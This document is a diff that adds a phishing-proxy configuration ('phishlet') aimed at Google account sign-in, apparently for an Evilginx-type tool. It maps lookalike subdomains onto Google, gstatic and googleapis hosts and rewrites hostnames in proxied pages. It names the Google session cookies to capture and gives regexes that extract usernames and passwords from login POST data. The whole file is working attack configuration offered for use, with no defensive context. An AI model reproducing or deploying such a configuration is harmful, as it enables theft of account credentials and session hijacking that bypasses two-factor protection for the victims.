@@ -1,0 +1,45 @@
+name: 'gl'
+author: 'ewhitman1'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true}
+  - {phish_sub: 'ssl', orig_sub: 'ssl', domain: 'gstatic.com', session: false, is_landing: false}
+  - {phish_sub: 'content', orig_sub: 'content', domain: 'googleapis.com', session: false, is_landing: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'gstatic.com', session: true, is_landing: false}
+  - {phish_sub: 'mail', orig_sub: 'mail', domain: 'google.com', session: false, is_landing: false}
+  - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: false, is_landing: false}
+sub_filters:
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://{hostname}/signin/', replace: 'https://{hostname}/signin/', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://{hostname}/speedbump/', replace: 'https://{hostname}/speedbump/', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'content', domain: 'googleapis.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'myaccount', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'ssl', domain: 'gstatic.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'www.google.com', orig_sub: 'www', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'content', domain: 'googleapis.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'mail', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://{hostname}/CheckCookie', replace: 'https://{hostname}/CheckCookie', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'ssl.google-analytics.com', orig_sub: 'ssl', domain: 'google-analytics.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'ssl.google-analytics.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'ssl.gstatic.com', orig_sub: 'accounts', domain: 'google.com', search: 'href="http://{hostname}/_/signin/challenge', replace: 'href="http://{hostname}/_/signin/challenge', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'content.googleapis.com', orig_sub: 'accounts', domain: 'google.com', search: 'href="http://{hostname}/cryptauth/v1/authzen/', replace: 'href="http://{hostname}/cryptauth/v1/authzen/', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'content.googleapis.com', orig_sub: 'content', domain: 'googleapis.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'ssl.gstatic.com', orig_sub: 'ssl', domain: 'gstatic.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'ssl.google-analytics.com', orig_sub: 'ssl', domain: 'google-analytics.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json']}
+auth_tokens:
+  - domain: '.google.com'
+    keys: ["SID", "HSID", "SSID", "APISID", "SAPISID", "NID"]
+  - domain: 'accounts.google.com'
+    keys: ["GAPS", "LSID"]
+credentials:
+  username:
+    key: 'f.req'
+    search: '\],"([^"]*)"\]$'
+    type: 'post'
+  password:
+    key: 'f.req'
+    search: ',\["([^"]*)",'
+    type: 'post'
+login:
+    domain: 'accounts.google.com'
+    path: 'ServiceLogin'
